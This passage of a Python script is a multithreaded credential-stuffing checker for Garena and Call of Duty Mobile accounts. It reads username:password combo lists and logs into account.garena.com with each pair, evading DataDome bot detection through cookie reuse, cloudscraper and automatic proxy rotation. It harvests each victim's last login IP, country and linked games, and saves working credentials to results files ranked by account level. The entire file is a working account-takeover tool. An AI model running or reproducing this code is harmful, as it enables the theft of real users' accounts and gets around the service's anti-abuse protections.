                    game_info.append({'region':region.upper(),'game':game_name,'role':str(role)})
            except: continue
    except Exception as e: pass
    return game_info

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results'):
    try:
        if shutdown_event.is_set(): return None
        if datadome_manager.is_blocked():
            logger.warning(f"{EMOJI['warning']} Skipping {account} - rotating proxy automatically...")
            new_proxies = refresh_proxy()
            if update_session_proxies(session, new_proxies):
                datadome_manager.reset_attempts()
                if datadome_manager.fetch_fresh_datadome_with_retry(session):
                    return "RATE_LIMITED"  # retry after proxy rotation
            return "RATE_LIMITED"
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome: datadome_manager.set_session_datadome(session, current_datadome)
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        if v1 == "IP_BLOCKED": return "RATE_LIMITED"
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return ""
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return ""
        current_cookies = session.cookies.get_dict()
        cookie_parts = [f"{name}={current_cookies[name]}" for name in ['apple_state_key','datadome','sso_key'] if name in current_cookies]
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        headers = {'accept':'*/*','referer':'https://account.garena.com/','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
        if cookie_header: headers['cookie'] = cookie_header
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder)
            live_stats.update_stats(valid=False)
            return "RATE_LIMITED"
        try: account_data = response.json()
        except: return ""
        if 'error' in account_data:
            live_stats.update_stats(valid=False)
            return ""
        if 'user_info' in account_data: details = parse_account_details(account_data)
        else: details = parse_account_details({'user_info': account_data})
        login_history = account_data.get('login_history') or []
        last_login_ip = None; last_login_where = None; last_login_ts = None
        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip')
                last_login_where = entry.get('country') or entry.get('location')
                last_login_ts = entry.get('timestamp')
        def fmt_ts(ts):
            try: return datetime.fromtimestamp(int(ts), tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except: return 'Unknown'
        details['last_login'] = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login_where'] = last_login_where or 'N/A'
        details['ip_for_msg'] = last_login_ip or account_data.get('init_ip') or 'N/A'
        if account_data.get('country'): details['country'] = account_data.get('country')
        has_codm, codm_info = check_codm_account(session, account)
        if CHECK_OTHER_GAMES:
            try: game_connections = get_game_connections(session, account)
            except: game_connections = []
        else: game_connections = []
        if has_codm and codm_info:
            codm_game = {'region':codm_info.get('region','N/A').upper(),'game':'CODM','role':codm_info.get('codm_nickname','N/A')}
            if 'CODM' not in [g.get('game','') for g in game_connections]:
                game_connections.insert(0, codm_game)
        details["game_info"] = game_connections
        if not has_codm or (codm_info and codm_info.get('codm_level','N/A')=='N/A'):
            live_stats.update_stats(valid=True, clean=details.get('is_clean',False), has_codm=False, game_connections=game_connections)
            save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)
            save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
            if game_connections: save_game_folder(account, password, details, None, game_connections, result_folder)
            display_codm_info(details, None)
            return ""
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome: cookie_manager.save_cookie(fresh_datadome)
        save_account_details_full(account, details, codm_info, password, result_folder)
        save_clean_or_notclean(account, password, details, codm_info, result_folder)
        if game_connections: save_game_folder(account, password, details, codm_info, game_connections, result_folder)
        codm_level = int(codm_info.get('codm_level',0)) if has_codm else 0
        country = details.get('personal',{}).get('country', codm_info.get('region','N/A') if has_codm else 'N/A')
        ign = codm_info.get('codm_nickname','N/A') if has_codm else 'N/A'
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level,
                               country=country, ign=ign, account=account, game_connections=game_connections)
        display_codm_info(details, codm_info)
        return ""
    except Exception as e:
        logger.error(f"{EMOJI['error']} Unexpected error processing: {e}")
        live_stats.update_stats(valid=False)
        return ""

def find_nearest_account_file():
    keywords = ["garena","account","codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")
    txt_files = []
    for root,_,files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"): txt_files.append(os.path.join(root, file))
    for file_path in txt_files:
        if any(k in os.path.basename(file_path).lower() for k in keywords): return file_path
    if txt_files: return random.choice(txt_files)
    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f: lines = f.readlines()
        unique = []
        seen = set()
        for line in lines:
            stripped = line.strip()
            if stripped and stripped not in seen:
                unique.append(line)
                seen.add(stripped)
        if len(lines)==len(unique): return False
        with open(file_path, 'w', encoding='utf-8') as f: f.writelines(unique)
        console.print(f"{EMOJI['success']} Removed {len(lines)-len(unique)} duplicates from {os.path.basename(file_path)}.")
        return True
    except Exception as e: return False

def select_input_file():
    """Revamped file selector using a Rich Table."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")
    
    console.print()
    header = Panel(Align.center(Text("📁 FILE SELECTOR", style="bold cyan")), border_style="cyan", box=ROUNDED, width=60)
    console.print(header)
    console.print()
    
    show_instructions = Confirm.ask("📖 [bold cyan]Show instructions?[/bold cyan]", default=False)
    if show_instructions:
        console.print(Panel(
            "[bold yellow]⚡ QUICK GUIDE[/bold yellow]\n\n"
            "🍪 Auto-generated cookies from fresh_cookies.txt\n"
            "🔄 Use RESERVE_FRESH_COOKIE.TXT as backup\n"
            "🔑 Rename reserve file to fresh_cookies.txt when needed\n"
            "🌍 IP blocked? Change IP + cookies immediately\n"
            "🚫 Blocked 2-3 times? Delete fresh_cookies.txt and use reserve",
            border_style="yellow", box=ROUNDED, title="📖 Instructions"))
        console.print()
    
    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder, exist_ok=True)
        console.print(Panel("[bold green]✅ Combo folder created![/bold green]\n\n⚠️  Add your .txt files to the Combo folder and restart", border_style="green", title="Setup Complete"))
        exit(0)
    
    with Progress(SpinnerColumn(), TextColumn("[bold cyan]Scanning files...[/bold cyan]"), transient=True) as progress:
        progress.add_task("scan", total=None)
        time.sleep(0.5)
        txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
    
    file_path = None
    if txt_files:
        table = Table(title="[bold cyan]Available Files[/bold cyan]", border_style="cyan", box=ROUNDED)
        table.add_column("#", style="dim", width=4)
        table.add_column("File Name", style="white")
        table.add_column("Size", justify="right")
        table.add_column("Lines", justify="right")
        for i, fname in enumerate(txt_files, 1):
            full = os.path.join(combo_folder, fname)
            size = os.path.getsize(full)
            size_str = f"{size/1024:.1f} KB" if size<1024*1024 else f"{size/1024/1024:.1f} MB"
            try:
                with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = sum(1 for line in f if line.strip())
            except:
                lines = 0
            table.add_row(str(i), fname, size_str, str(lines))
        console.print(table)
        console.print()
        while True:
            choice = Prompt.ask("🎯 [bold cyan]Select file number (or Enter for auto-detect)[/bold cyan]", default="")
            if not choice:
                with Progress(SpinnerColumn(), TextColumn("[bold yellow]🔍 Auto-detecting...[/bold yellow]"), transient=True) as progress:
                    progress.add_task("search", total=None)
                    time.sleep(0.8)
                file_path = find_nearest_account_file()
                break
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(txt_files):
                    file_path = os.path.join(combo_folder, txt_files[idx])
                    console.print(Panel(f"✅ [bold green]Selected:[/bold green] [cyan]{txt_files[idx]}[/cyan]", border_style="green", box=ROUNDED))
                    break
                else:
                    console.print("❌ [red]Invalid choice. Pick 1-{}.[/red]".format(len(txt_files)))
            except ValueError:
                console.print("❌ [red]Enter a valid number.[/red]")
    else:
        console.print(Panel("⚠️ [yellow]No .txt files found in Combo folder[/yellow]\n\nAdd files to: [cyan]Combo/[/cyan]", border_style="yellow", title="No Files"))
        file_path = Prompt.ask("📁 [cyan]Enter file path (or Enter to auto-search)[/cyan]").strip()
        if not file_path:
            with Progress(SpinnerColumn(), TextColumn("[bold yellow]🔍 Auto-searching...[/bold yellow]"), transient=True) as progress:
                progress.add_task("search", total=None)
                time.sleep(0.8)
            file_path = find_nearest_account_file()
    console.print()
    return file_path

def main():
    global account_counter, counter_lock, live_display
    def sig_handler(sig, frame):
        console.print(f"\n\n{EMOJI['stop']} [yellow]⚠️  Script terminated by user (Ctrl+C)[/yellow]\n{EMOJI['play']} [cyan]Stopping immediately...[/cyan]\n")
        shutdown_event.set()
        if live_stats_global: live_stats_global.display_final_summary()
        os._exit(0)
    signal.signal(signal.SIGINT, sig_handler)
    
    print_banner()
    
    cleanup_result_files()
    filename = select_input_file()
    if not os.path.exists(filename): console.print(f"{EMOJI['error']} ✘ File not found: {filename}"); return
    result_folder = "results"
    console.print(f"{EMOJI['folder']} [cyan]📁 Results folder: {result_folder}/[/cyan]")
    os.makedirs(result_folder, exist_ok=True)
    console.print()
    auto_remove = console.input(f"{EMOJI['database']} [cyan]🗑️  Auto-remove checked lines? (y/N): [/cyan]").strip().lower() == "y"
    console.print()
    while True:
        try:
            thread_input = console.input(f"{EMOJI['gear']} [cyan]🧵 Number of threads (1-50, default 1): [/cyan]").strip()
            max_workers = int(thread_input) if thread_input else 1
            if 1 <= max_workers <= 50: break
            else: console.print(f"{EMOJI['error']} [red]✘ Please enter a number between 1 and 50[/red]")
        except ValueError: console.print(f"{EMOJI['error']} [red]✘ Please enter a valid number[/red]")
        except KeyboardInterrupt: console.print(f"\n{EMOJI['stop']} [yellow]⚠️  Cancelled by user[/yellow]"); return
    console.print(f"{EMOJI['success']} [green]✔ Using {max_workers} thread(s)[/green]")
    console.print()
    global CHECK_OTHER_GAMES
    other_games = console.input(f"{EMOJI['game']} [cyan]Check other games (AOV / ROV / Delta Force / etc)? (y/N): [/cyan]").strip().lower()
    CHECK_OTHER_GAMES = other_games == "y"
    console.print(f"{EMOJI['check']} [green]✔ Will check all game connections[/green]" if CHECK_OTHER_GAMES else f"{EMOJI['info']} [yellow]  CODM only — skipping other game checks[/yellow]")
    console.print()
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    global live_stats_global
    live_stats_global = live_stats
    session = cloudscraper.create_scraper()
    session.proxies.update(PROXIES)
    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
        combined = "; ".join(valid_cookies)
        console.print(f"{EMOJI['cookie']} [green]✔ Loaded {len(valid_cookies)} saved cookies[/green]")
        applyck(session, combined)
        last_cookie = valid_cookies[-1]
        datadome_val = last_cookie.split('=',1)[1].strip() if '=' in last_cookie and len(last_cookie.split('=',1))>1 else None
        if datadome_val: datadome_manager.set_datadome(datadome_val)
    else:
        console.print(f"{EMOJI['warning']} [yellow]⚠️  No saved cookies. Generating fresh session...[/yellow]")
        dd = get_datadome_cookie(session)
        if dd: datadome_manager.set_datadome(dd); console.print(f"{EMOJI['success']} [green]✔ Generated DataDome cookie[/green]")
    accounts = []
    for enc in ['utf-8','latin-1','cp1252','iso-8859-1']:
        try:
            with open(filename, 'r', encoding=enc) as f:
                accounts = [line.strip() for line in f if line.strip() and not line.startswith('===')]
            console.print(f"{EMOJI['success']} [green]✔ File loaded ({enc})[/green]")
            break
        except: continue
    if not accounts:
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                accounts = [line.strip() for line in f if line.strip() and not line.startswith('===')]
            console.print(f"{EMOJI['success']} [green]✔ File loaded with fallback encoding[/green]")
        except Exception as e: console.print(f"{EMOJI['error']} ✘ Could not read file: {e}"); return
    if not accounts: console.print(f"{EMOJI['error']} ✘ No valid accounts found"); return
    console.print(f"{EMOJI['chart']} [cyan]📊 Processing {len(accounts)} accounts with {max_workers} thread(s)...[/cyan]\n")
    console.print(f"{EMOJI['line']} [cyan]{'─'*75}[/cyan]\n")
    account_counter = {"count":0,"total":len(accounts)}
    counter_lock = Lock()
    account_index = 0
    retry_queue = []
    
    # Live stats panel using rich Live
    with Live(live_stats.generate_live_panel(), console=console, refresh_per_second=4, screen=False) as live:
        live_display = live  # make available to wrapper if needed (we'll pass it)
        while account_index < len(accounts) or retry_queue:
            if shutdown_event.is_set(): break
            # Silent automatic proxy rotation if blocked
            if datadome_manager.is_blocked():
                logger.info("Rotating proxy due to block...")
                new_proxies = refresh_proxy()
                if update_session_proxies(session, new_proxies):
                    datadome_manager.reset_attempts()
                    if datadome_manager.fetch_fresh_datadome_with_retry(session):
                        continue
                time.sleep(1)
                continue
            if retry_queue:
                current_batch = retry_queue[:max_workers*10]
                retry_queue = retry_queue[max_workers*10:]
                logger.info(f"{EMOJI['refresh']} 🔄 Processing {len(current_batch)} retry accounts...")
            else:
                batch_size = min(max_workers*10, len(accounts)-account_index)
                if batch_size <= 0: break
                current_batch = accounts[account_index:account_index+batch_size]
            with GracefulThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for line in current_batch:
                    if shutdown_event.is_set(): break
                    futures.append(executor.submit(process_account_wrapper, line, session, cookie_manager, datadome_manager, live_stats, result_folder, filename, auto_remove))
                batch_limited = False
                processed = []
                for fut, line in zip(futures, current_batch):
                    if shutdown_event.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        return
                    try:
                        res = fut.result(timeout=30)
                        if res == "RATE_LIMITED":
                            if line not in retry_queue: retry_queue.append(line)
                            batch_limited = True
                        else:
                            processed.append(line)
                    except Exception as e:
                        processed.append(line)
                    # Update live stats panel
                    live.update(live_stats.generate_live_panel())
                if not retry_queue or any(acc in accounts[account_index:account_index+batch_size] for acc in processed):
                    for acc in processed:
                        if account_index < len(accounts) and accounts[account_index] == acc:
                            account_index += 1
                if batch_limited: continue
                if account_index < len(accounts) or retry_queue: time.sleep(0.5)
    if shutdown_event.is_set():
        console.print(f"\n{EMOJI['stop']} [yellow]⚠️  Processing interrupted by user[/yellow]")
        if live_stats_global: live_stats_global.display_final_summary()
        return
    live_stats.display_final_summary()
    console.print()

def process_account_wrapper(account_line, session, cookie_manager, datadome_manager, live_stats, result_folder, filename, AUTO_REMOVE_CHECKED):
    if shutdown_event.is_set(): return None
    if ':' not in account_line: return None
    try:
        account, password = account_line.split(':',1)
        account = account.strip(); password = password.strip()
        with counter_lock:
            account_counter["count"] += 1
            idx = account_counter["count"]
        console.print(f"{EMOJI['gear']} [bold cyan][{idx}/{account_counter['total']}] Processing: {account}[/bold cyan]")
        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder)
        if result == "RATE_LIMITED":
            logger.warning(f"{EMOJI['warning']} ⏸️  Account {account} hit rate limit - will retry after IP change")
            with counter_lock: account_counter["count"] -= 1
            return "RATE_LIMITED"
        if result: print(result)
        print(f"\n  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}\n")
        if AUTO_REMOVE_CHECKED:
            with file_lock:
                try:
                    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                        remain = [ln for ln in f if ln.strip() != account_line.strip()]
                    with open(filename, "w", encoding="utf-8") as f:
                        for r in remain: f.write(r if r.endswith("\n") else r+"\n")
                except: pass
        return "SUCCESS"
    except Exception as e:
        console.print(f"{EMOJI['error']} ✘ Failed to process {account}: {e}")
        return None

def cleanup_result_files():
    result_files = ['Results/Clean.txt','Results/Not_Clean.txt','Results/Shell.txt']
    if os.path.exists('Results/notclean.txt'):
        try: os.remove('Results/notclean.txt'); console.print(f"{EMOJI['folder']} Removed old notclean.txt file")
        except: pass
    for file_path in result_files:
        if not os.path.exists(file_path): continue
        try:
            with open(file_path, 'r', encoding='utf-8') as f: content = f.read()
            if not content.strip(): continue
            if re.search(r'^\d+\.$', content, re.MULTILINE):
                console.print(f"{EMOJI['gear']} Cleaning corrupted file: {file_path}")
                existing = []
                entries = content.split('\n\n')
                for entry in entries:
                    entry = entry.strip()
                    if entry:
                        lines = entry.split('\n')
                        cleaned = '\n'.join([line for line in lines if not re.match(r'^\d+\.$', line.strip())])
                        if cleaned.strip():
                            m = re.search(r'Level: (\d+)', cleaned)
                            if m: existing.append((int(m.group(1)), cleaned.strip()))
                existing.sort(key=lambda x: x[0], reverse=True)
                with open(file_path, 'w', encoding='utf-8') as f:
                    for lvl, entry in existing: f.write(f"{entry}\n\n")
                console.print(f"{EMOJI['success']} Fixed {file_path}")
        except Exception as e: console.print(f"{EMOJI['error']} Error cleaning {file_path}: {e}")

if __name__ == "__main__":
    live_stats_global = None
    try: main()
    except KeyboardInterrupt:
        console.print(f"\n{EMOJI['stop']} [yellow]⚠️  Script terminated by user[/yellow]")
        if live_stats_global: live_stats_global.display_final_summary()
        sys.exit(0)
    except Exception as e:
        console.print(f"{EMOJI['error']} ✘ Unexpected error: {e}")
        if live_stats_global: live_stats_global.display_final_summary()
        sys.exit(1)
